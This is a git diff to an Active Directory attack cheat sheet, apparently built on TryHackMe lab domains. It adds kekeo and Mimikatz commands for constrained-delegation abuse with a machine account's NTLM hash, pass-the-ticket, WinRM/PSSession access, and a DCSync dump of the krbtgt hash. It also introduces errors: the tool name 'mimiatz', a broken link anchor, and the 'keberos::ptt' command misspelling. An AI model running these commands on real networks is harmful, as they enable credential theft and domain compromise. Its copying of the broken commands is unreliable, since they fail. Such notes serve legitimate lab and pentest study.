@@ -10,8 +10,9 @@ To facilitate navigation, a link has been added at the end of each section to go
     - 2.3. [Others](#others)
 - 3. [Enumeration](#enumeration)
     - 3.1. [PowerView](#powerview)
-    - 3.2. [User Hunting](#user-hunting)
-    - 3.3. [BloodHound](#bloodhound)
+    - 3.2. [Linux](linux)
+    - 3.3. [User Hunting](#user-hunting)
+    - 3.4. [BloodHound](#bloodhound)
 - 4. [Initial Attacks Vectors](#initial-attacks-vectors)
     - 4.1. [LLMNR Poisoning](#llmnr-poisoning)
     - 4.2. [SMB Relay](#smb-relay)
@@ -54,7 +55,7 @@ To facilitate navigation, a link has been added at the end of each section to go
 - [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
 - Impacket
 - hashcat
-- mimikatz
+- mimiatz
 - Rubeus
 - Bloodhound
 - Kerbrute
@@ -334,6 +335,7 @@ hashcat -m 13100 [hash.txt] /wordlist/
 Get-DomainUser -TrustedToAuth
 Get-DomainComputer -TrustedToAuth
 
+### USER ###
 # kekeo
 # Request TGT
 tgt::ask /user:[user] /domain:[domain] /password:[Password]
@@ -345,10 +347,34 @@ tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.L
 privilege::debug
 keberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
 
-# Then, create our PSSession
+### COMPUTER ###
+# kekeo
+## Request TGT
+tgt::ask /user:[machine account] /domain:[domain] /rc4:[ntlm hash of machine]
+
+## Request S4U TGS
+tgs::s4u /tgt:[previous ticket] /user:Administrator@[domain] /service:CIFS/mgmtsrv.tech.finance.corp
+## Alt service
+tgs::s4u /tgt:[previous ticket] /user:Administrator@[domain] /service:CIFS/mgmtsrv.tech.finance.corp|ldap/mgmtsrv.tech.finance.corp
+
+# Mimikatz
+kerberos::ptt TGS_....kirbi
+
+klist
+# Our next step will depend on the service we have enabled.
+## HTTP service
+### PSSession
 New-PSSession  -ComputerName [computername]
 Enter-PSSession -ComputerName [Computername]
+### Winrm
+winrm -r:[computer] cmd
+
+## LDAP service
+Invoke-Mimikatz -Command "lsadump::dcsync /user:<shortdomain>\krbtgt" "exit"
+
+## HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights)
 ```
+> Clean tickets with: klist purge
 
 ### Unconstrained Delegation
 ```powershell
@@ -385,6 +411,7 @@ list tokens -u
 
 impersonate_token [DOMAIN]\\[User]
 ```
+
 ```powershell
 # WITH WINDOWS
 # https://github.com/FSecureLABS/incognito/tree/394545ffb844afcc18e798737cbd070ff3a4eb29
